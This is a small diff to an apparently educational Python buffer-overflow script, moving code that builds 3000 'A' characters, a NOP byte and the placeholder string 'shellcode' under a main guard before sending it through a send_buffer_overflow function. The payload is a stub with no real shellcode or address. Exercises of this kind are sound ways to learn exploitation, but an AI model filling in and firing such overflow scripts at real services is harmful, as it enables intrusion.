@@ -22,10 +22,10 @@ def send_buffer_overflow(my_buf):
     # Print out what we received
     print(f'Received: {data}')
 
+if (__name__ == '__main__'):
+    # Build a happy little message folloewd by a newline
+    buf = 'A'*3000 + 'IBP' + '\x90' + 'shellcode'
+    buf += 'Python Script'
+    buf += '\n'
 
-# Build a happy little message folloewd by a newline
-buf = 'A'*3000 + 'IBP' + '\x90' + 'shellcode'
-buf += 'Python Script'
-buf += '\n'
-
-send_buffer_overflow(buf)
+    send_buffer_overflow(buf)
